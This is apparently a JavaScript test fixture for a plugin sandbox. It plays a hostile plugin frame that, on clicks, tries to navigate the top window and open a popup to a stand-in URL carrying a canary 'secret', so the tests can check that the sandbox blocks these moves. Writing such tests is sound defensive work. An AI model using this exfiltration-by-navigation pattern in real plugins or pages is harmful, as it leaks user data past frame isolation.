// A plugin view that tries everything a plugin frame must not do (#2824).
// Each attempt is wired to a click, so it runs with user activation — the
// strongest form a real plugin's attempt could take.
window.scriptRan = true;
const LEAK = 'https://example.com/leak?secret=plugin-frame-canary';
document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('top-nav').addEventListener('click', () => {
    try { window.top.location.href = LEAK; } catch (e) { window.topNavError = String(e); }
  });
  document.getElementById('self-nav').addEventListener('click', () => {
    window.location.href = 'other.html';
  });
  document.getElementById('popup').addEventListener('click', () => {
    window.popupResult = String(window.open(LEAK));
  });
});
